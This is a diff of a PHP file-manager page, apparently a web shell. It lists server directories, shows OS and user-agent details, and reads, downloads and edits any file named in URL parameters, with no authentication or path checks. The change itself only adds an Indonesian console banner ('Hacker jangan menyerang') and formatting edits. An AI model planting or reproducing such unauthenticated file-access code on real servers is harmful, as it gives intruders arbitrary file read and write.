@@ -31,6 +31,19 @@
 			}
 
 		}
+
+
+	</script>
+
+	<script type="text/javascript">
+		console.log(`
+
+			🅷🅰🅲🅺🅴🆁
+			🅹🅰🅽🅶🅰🅽
+			🅼🅴🅽🆈🅴🆁🅰🅽🅶
+
+			`);
+		console.log('Hacker jangan menyerang !!');
 	</script>
 
 
@@ -41,8 +54,8 @@
 
 	echo 'User Agent: '.$_SERVER['HTTP_USER_AGENT'];
 	echo "<br>";
-	
-	
+
+
 	function path() {
 		if(isset($_GET['dir'])) {
 			$dir = str_replace("\\", "/", $_GET['dir']);
@@ -91,7 +104,7 @@
 
 	if (isset($_GET['act'])) {
 		if ($_GET['act']=="download") {
-			
+
 
 			$file_path = $_GET['dir'].$_GET['f'];
 			$filename = $_GET['f'];
@@ -109,7 +122,7 @@
 		}
 	}
 
-	
+
 
 	echo "<br>";
 	echo "OS : ".OS();
@@ -142,10 +155,10 @@
 			$direktori = $value.'/';
 		}
 
-		
+
 		echo '<a href="?dir='.$direktori.'/">'.$value.'</a>/';
 	}
-	
+
 
 	$dir = path();	
 
@@ -167,9 +180,9 @@
 
 	echo "</ul>";
 
-	
 
-	
+
+
 
 	if (isset($_GET['f'])) {
 
@@ -182,9 +195,9 @@
 		echo '<div class="card card-body"><form method="POST">';
 
 		$myfile = fopen($_GET['dir'].$_GET['f'], "r") or die("Unable to open file!");
-		echo '<textarea name="code" class="form-control" rows="20">'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
+		echo '<textarea name="code" class="form-control" rows="20" autofocus>'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
 		fclose($myfile);
-		
+
 		echo '<div class="col-sm-4"><input type="submit" class="btn btn-primary" name="" value="Edit"/></div>
 		</form> 
 		<div class="col-sm-4"><button class="btn btn-success" onclick="addUrlParameter('."'act','download'".')">Download</button>
@@ -193,7 +206,7 @@
 	}
 
 	?>
-	
+
 
 </body>
 </html>
